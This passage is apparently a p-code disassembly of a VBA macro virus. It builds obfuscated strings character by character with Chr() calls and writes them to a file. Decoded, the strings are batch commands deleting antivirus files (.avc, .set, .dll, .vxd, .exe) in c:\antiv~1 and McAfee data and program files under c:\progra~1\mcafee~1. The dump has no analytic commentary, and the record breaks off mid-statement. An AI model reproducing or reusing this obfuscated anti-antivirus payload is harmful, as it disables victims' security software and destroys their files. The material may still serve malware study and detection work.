' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St SS$ 
' Line #98:
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St TT$ 
' Line #99:
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UU$ 
' Line #100:
' 	Ld OO$ 
' 	Ld PP$ 
' 	Concat 
' 	Ld QQ$ 
' 	Concat 
' 	Ld SS$ 
' 	Concat 
' 	Ld TT$ 
' 	Concat 
' 	Ld UU$ 
' 	Concat 
' 	St YY$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld YY$ 
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #102:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PP$ 
' Line #103:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St QQ$ 
' Line #104:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St SS$ 
' Line #105:
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
